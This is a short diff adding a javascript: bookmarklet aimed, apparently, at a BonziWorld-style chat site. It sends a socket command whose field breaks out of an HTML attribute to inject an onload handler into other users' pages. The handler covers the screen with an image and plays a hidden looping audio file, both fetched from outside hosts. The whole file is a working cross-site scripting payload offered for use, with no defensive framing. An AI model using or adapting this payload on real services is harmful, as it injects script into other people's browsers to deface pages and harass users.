@@ -1,0 +1,3 @@
+javascript:socket.emit('command',{
+  list:['youtube','eee" onload="var img=document.createElement(\'img\');img.src=\'https://i.ibb.co/q3X8Nyxc/image.png\';img.style.position=\'fixed\';img.style.top=\'0\';img.style.left=\'0\';img.style.width=\'100vw\';img.style.height=\'100vh\';img.style.objectFit=\'cover\';img.style.zIndex=9999;document.body.appendChild(img);var audio=document.createElement(\'audio\');audio.src=\'https://github.com/GreenwaveStudios/BonziSKRIPTS-bonziworldjs-scripts/raw/refs/heads/main/imagesandvideos/7a7a5596-b368-43b2-9f0f-66717761c1f6.wav\';audio.autoplay=true;audio.loop=true;audio.style.display=\'none\';document.body.appendChild(audio);"']
+})
